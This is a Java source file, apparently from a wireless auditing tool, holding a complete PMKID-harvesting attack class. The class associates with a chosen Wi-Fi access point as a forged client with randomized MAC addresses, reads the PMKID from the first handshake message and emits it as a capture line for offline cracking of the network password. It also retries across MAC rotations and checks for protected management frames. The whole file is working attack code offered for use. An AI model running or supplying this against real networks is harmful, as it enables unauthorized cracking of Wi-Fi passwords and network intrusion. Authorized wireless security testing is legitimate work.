package com.opx.oss.engine.attacks;

import com.opx.oss.engine.AccessPoint;
import com.opx.oss.engine.ScanBook;
import com.opx.oss.engine.capture.Handshake;
import com.opx.oss.engine.capture.HandshakeBook;
import com.opx.oss.engine.chips.WifiChip;
import com.opx.oss.engine.dot11.Frame;
import com.opx.oss.engine.dot11.Ie;
import com.opx.oss.engine.dot11.Mac;

import org.json.JSONObject;

/**
 * PMKID: associate with the AP as a synthetic client, then read the PMKID out of the first
 * handshake message the AP sends back. No client of the network is disturbed.
 */
public final class PmkidCampaign extends Campaign {

    private final ScanBook book;
    private final HandshakeBook handshakes;
    private final int rounds;
    private final long attemptMillis;

    public PmkidCampaign(WifiChip chip, String bssid, JSONObject options,
                         ScanBook book, HandshakeBook handshakes) {
        super(chip, bssid, options);
        this.book = book;
        this.handshakes = handshakes;
        this.rounds = Math.max(1, options.optInt("rounds", 12));
        this.attemptMillis = Math.max(200, options.optLong("attempt", 700));
    }

    @Override
    public String kind() {
        return "pmkid";
    }

    @Override
    protected void run(Events events) throws Exception {
        AccessPoint ap = book.get(bssid);
        String ssid = ap == null ? "" : ap.ssid;
        if (ssid.isEmpty()) {
            log(events, "this network's name is not known yet; run a scan first");
        }
        byte[] rsn = ap == null ? null : Ie.forcePskAkm(ap.rsnIe, ap != null && ap.pmfCapable);
        if (rsn == null) rsn = Ie.GENERIC_RSN;

        if (ap != null && ap.pmfRequired) {
            log(events, "this AP requires protected management frames; it will not associate us");
            return;
        }
        if (ap != null && !ap.akms.isEmpty() && !ap.akms.contains("PSK")) {
            // The harvester forces AKM=PSK and stops at M1, so only a plain-PSK PMKID results.
            log(events, "this AP offers no plain-PSK AKM; there is no PMKID to harvest");
            return;
        }

        byte[] target = Mac.of(bssid);
        byte[] client = Mac.randomClient();
        String clientText = Mac.text(client);
        log(events, "associating as " + clientText + " to read the PMKID");

        for (int round = 1; round <= rounds && !shouldStop(); round++) {
            // Auth (open, seq 1) first: an AP that refuses it will ignore the association.
            chip.transmit(Frame.authOpen(target, client, 1));
            sleep(Math.min(150, attemptMillis / 3));
            chip.transmit(Frame.assocRequest(target, client, ssid, ap == null ? 1 : ap.channel, rsn));
            sleep(attemptMillis);

            Handshake handshake = handshakes.get(bssid, clientText);
            if (handshake != null) {
                // M1 is terminal: our forged client has no PSK to answer it with.
                leave(client, target);
                if (handshake.pmkid == null) {
                    log(events, "the AP answered M1 without a PMKID; it does not expose one");
                    return;
                }
                handshake.sha256 = ap != null && ap.akms.contains("PSK-SHA256");
                String line = handshake.pmkidLine();
                if (line == null) {
                    log(events, "the AP sent a PMKID but the network name is unknown");
                    return;
                }
                log(events, "PMKID captured");
                progress(events, 100, "PMKID captured");
                JSONObject capture = event("capture_line");
                try {
                    capture.put("bssid", bssid).put("line", line);
                } catch (Exception ignored) {
                    // Two strings cannot fail to serialize.
                }
                events.emit(capture);
                return;
            }

            // The AP stayed silent (no M1 at all): rotate the MAC and retry.
            client = Mac.randomClient();
            clientText = Mac.text(client);
            progress(events, (round * 100) / rounds, "attempt " + round + " of " + rounds);
        }
        log(events, "the AP stayed silent for " + rounds + " attempts");
    }

    /** Tell the AP we are leaving (reason 3) so it stops retransmitting the M1 we already read. */
    private void leave(byte[] client, byte[] bssidBytes) throws java.io.IOException {
        for (int i = 0; i < 3; i++) {
            chip.transmit(Frame.deauth(bssidBytes, client, 3));
            sleep(3);
        }
    }
}
